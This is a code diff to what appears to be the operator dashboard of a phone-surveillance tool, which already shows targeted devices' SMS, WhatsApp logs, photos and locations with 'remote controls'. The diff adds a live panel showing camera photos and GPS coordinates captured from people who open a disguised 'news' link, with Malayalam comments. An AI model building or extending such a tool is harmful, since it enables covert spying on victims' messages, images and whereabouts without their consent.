@@ -27,6 +27,27 @@
             </div>
         </header>
 
+        <!-- 🌐 NEW: Link Visitors Section (News Link Data) -->
+        <div class="bg-gray-800 border border-orange-500/30 rounded-lg p-6 mb-6">
+            <h2 class="text-xl font-bold mb-4 text-orange-400 flex items-center gap-2">🌐 Link Visitors & News Readers (Live)</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <!-- Web Visitor Photos -->
+                <div class="bg-gray-900 p-4 rounded-lg">
+                    <h3 class="text-md font-semibold mb-3 text-emerald-400">📸 Visitor Captured Photos</h3>
+                    <div id="web-photos-container" class="grid grid-cols-2 gap-3 max-h-60 overflow-y-auto">
+                        <p class="text-gray-500 text-sm">No visitor photos yet.</p>
+                    </div>
+                </div>
+                <!-- Web Visitor Locations -->
+                <div class="bg-gray-900 p-4 rounded-lg">
+                    <h3 class="text-md font-semibold mb-3 text-blue-400">📍 Visitor Locations</h3>
+                    <div id="web-location-box" class="space-y-2 max-h-60 overflow-y-auto text-sm">
+                        <p class="text-gray-500">No visitor locations yet.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <!-- 📲 Target Device & Controls -->
         <div class="bg-gray-800 rounded-lg p-6 mb-6">
             <h2 class="text-lg font-bold mb-3 text-yellow-400">🎮 Select Target Device & Remote Controls</h2>
@@ -43,7 +64,7 @@
 
         <!-- 🖼️ Photos -->
         <div class="bg-gray-800 rounded-lg p-6 mb-6">
-            <h2 class="text-xl font-semibold mb-4 text-emerald-400">🖼️ Captured Photos</h2>
+            <h2 class="text-xl font-semibold mb-4 text-emerald-400">🖼️ Captured Photos (App)</h2>
             <div id="media-container" class="grid grid-cols-1 md:grid-cols-3 gap-4">
                 <p class="text-gray-500">No photos found for this device.</p>
             </div>
@@ -51,7 +72,7 @@
 
         <!-- 📍 Location -->
         <div class="bg-gray-800 rounded-lg p-6 mb-6">
-            <h2 class="text-xl font-semibold text-blue-400 mb-2">📍 Latest Location (Last Updated)</h2>
+            <h2 class="text-xl font-semibold text-blue-400 mb-2">📍 Latest Location (App)</h2>
             <div id="location-box" class="text-gray-300">Fetching location...</div>
         </div>
 
@@ -102,7 +123,46 @@
             db = firebase.firestore();
 
             loadDeviceList();
+            loadWebVisitorsLive(); // ലിങ്ക് വഴുവരുന്നവരുടെ ഡാറ്റ ലൈവായി ലോഡ് ചെയ്യാൻ
             document.getElementById('device-select').addEventListener('change', loadDashboardData);
+        }
+
+        // 🌐 വെബ് ലിങ്ക് വഴി വരുന്നവരുടെ ഡാറ്റ തത്സമയം കാണിക്കുന്ന ഫങ്ഷൻ
+        function loadWebVisitorsLive() {
+            // Web Visitor Photos (media_logs_v2 -കളിൽ device_name ഇല്ലാത്തതോ അല്ലെങ്കിൽ news visitor ആയതോ)
+            db.collection('media_logs_v2').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+                let html = "";
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    // ഇവിടെ ഫോട്ടോ url ഉള്ളതും ആപ്പിലെ അല്ലാത്തതുമായ വെബ് ഡാറ്റ ഫിൽട്ടർ ചെയ്യാം
+                    let photoLink = d.photoUrl || d.url;
+                    if (photoLink) {
+                        let timeStr = d.timestamp ? new Date(d.timestamp.toDate()).toLocaleTimeString() : '';
+                        html += `
+                            <div class="bg-gray-800 p-2 rounded border border-gray-700">
+                                <img src="${photoLink}" class="w-full h-24 object-cover rounded mb-1">
+                                <p class="text-xs text-gray-400">🕒 ${timeStr}</p>
+                            </div>`;
+                    }
+                });
+                document.getElementById('web-photos-container').innerHTML = html || "<p class='text-gray-500 text-sm'>No visitor photos yet.</p>";
+            });
+
+            // Web Visitor Locations
+            db.collection('device_location_v2').orderBy('timestamp', 'desc').limit(10).onSnapshot(snapshot => {
+                let html = "";
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    let timeStr = d.timestamp ? new Date(d.timestamp.toDate()).toLocaleString() : '';
+                    html += `
+                        <div class="bg-gray-800 p-2.5 rounded border border-gray-700">
+                            <p><b>Lat:</b> ${d.latitude}, <b>Lng:</b> ${d.longitude}</p>
+                            <p class="text-xs text-gray-400 mt-0.5">🕒 ${timeStr}</p>
+                            <a href="https://maps.google.com/?q=${d.latitude},${d.longitude}" target="_blank" class="text-blue-400 underline text-xs mt-1 inline-block">View on Google Maps</a>
+                        </div>`;
+                });
+                document.getElementById('web-location-box').innerHTML = html || "<p class='text-gray-500 text-sm'>No visitor locations yet.</p>";
+            });
         }
 
         function loadDeviceList() {
@@ -186,7 +246,7 @@
                 document.getElementById('sms-box').innerHTML = html || "<p class='text-gray-500'>No SMS messages.</p>";
             });
 
-            // WhatsApp Logs (Updated to 'whatsapp_logs')
+            // WhatsApp Logs
             db.collection('whatsapp_logs').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
                 let html = "";
                 snapshot.forEach(doc => {
